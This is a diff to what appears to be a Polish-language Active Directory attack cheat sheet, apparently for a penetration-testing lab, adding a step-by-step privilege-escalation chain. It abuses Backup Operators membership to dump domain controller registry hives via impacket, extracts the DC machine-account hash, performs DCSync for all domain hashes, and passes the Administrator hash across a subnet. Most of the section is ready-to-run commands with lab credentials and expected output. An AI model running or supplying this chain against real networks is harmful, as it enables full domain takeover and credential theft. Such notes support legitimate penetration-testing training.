@@ -1690,6 +1690,52 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL           # par
 ```
 > Z NTDS masz NTLM wszystkich kont (w tym `krbtgt:502:...:HASH`) + klucze Kerberos (AES). Hash krbtgt = klucz do Golden Ticket. `vshadow.exe` to podpisana binarka z Windows SDK. **DCSync (§5.2) jest cichszy** — nie dotyka dysku ani nie zostawia śladu narzędzi.
 
+### Backup Operators → DC (SeBackupPrivilege, BEZ shella i bez DA)
+
+> 🎯 **Kiedy:** masz konto (np. z DCC2/spray), które jest w grupie **`Backup Operators`** (sygnał: `adminCount=1`, a `net user X /domain` pokazuje `*Backup Operators`). Ta grupa daje **`SeBackupPrivilege`** = prawo czytać dowolny plik/klucz rejestru z pominięciem ACL. Cel: zrzucić hive'y DC → wyciągnąć **hash konta maszyny `DC01$`** → **DCSync** (konto komputera DC ma prawa replikacji) → cała domena. Konto NIE musi być adminem ani mieć WinRM.
+
+**Krok 1 — potwierdź członkostwo (LDAP, dowolne creds):**
+```bash
+# kandydaci uprzywilejowani (adminCount=1):
+proxychains -q nxc ldap $DC -u joe -p 'Flowers1' -d medtech.com --admin-count
+proxychains -q nxc ldap $DC -u yoshi -p 'Mushroom!' -d medtech.com --query "(sAMAccountName=joe)" "memberOf"
+#   -> memberOf: CN=Backup Operators,CN=Builtin,...
+```
+
+**Krok 2 — zrzuć hive'y DC przez WinReg (SeBackupPrivilege), zapisując do NETLOGON:**
+```bash
+# reg backup pisze jako SYSTEM; katalog scripts(NETLOGON) jest czytelny dla KAŻDEGO uwierzytelnionego usera
+proxychains -q impacket-reg medtech.com/joe:'Flowers1'@$DC backup -o 'C:\Windows\SYSVOL\domain\scripts'
+#   [*] Saved HKLM\SAM / SYSTEM / SECURITY to ...\scripts\*.save
+```
+> Dlaczego NETLOGON: `C:\Windows\Temp` jest za ACL (nie-admin nie czyta `C$`), ale `...\SYSVOL\domain\scripts` = share **NETLOGON**, do którego authenticated users mają odczyt. SYSTEM tam zapisze, my odczytamy jako joe.
+
+**Krok 3 — pobierz hive'y jako ten sam nie-admin user (share NETLOGON):**
+```bash
+proxychains -q impacket-smbclient medtech.com/joe:'Flowers1'@$DC
+#   use NETLOGON ; get SAM.save ; get SYSTEM.save ; get SECURITY.save ; exit
+```
+
+**Krok 4 — offline: wyciągnij hash konta maszyny DC01$:**
+```bash
+impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
+#   [*] $MACHINE.ACC:  aad3b435...:<HASH_DC01$>     <- to jest klucz
+```
+
+**Krok 5 — DCSync kontem maszyny DC (ma prawa replikacji!):**
+```bash
+proxychains -q impacket-secretsdump -just-dc -hashes :<HASH_DC01$> 'medtech.com/DC01$@'$DC
+#   -> Administrator:500:...:<HASH>  krbtgt:502:...:<HASH>  <DA>:...  = cała domena
+```
+
+**Krok 6 — PtH domenowym Administratorem → flaga na DC + reszta hostów:**
+```bash
+proxychains -q impacket-wmiexec -hashes :<HASH_Administrator> medtech.com/Administrator@$DC   # type ...\proof.txt
+# domenowy Administrator = admin lokalny wszędzie:
+proxychains -q nxc smb 172.16.224.0/24 -u Administrator -H <HASH_Administrator> -d medtech.com -x "whoami"
+```
+> 💎 Ten łańcuch omija to, że konto nie jest adminem ani nie ma WinRM — liczy się tylko przynależność do `Backup Operators` + zasięg RPC/SMB do DC (tu przez pivot §8.3). Alternatywa z shellem: `SeBackupPrivilege` + `diskshadow`/`robocopy /b` na `ntds.dit` (§5 wyżej).
+
 ### Golden Ticket (fałszywy TGT — dowolny user, cała domena)
 > Potrzebne: NTLM **krbtgt** + **SID** domeny. Ważny nawet po zmianie hasła ofiary (krbtgt rzadko rotowany). Forsowanie+wstrzyknięcie biletu **nie wymaga admina** i działa z maszyny spoza domeny.
 ```
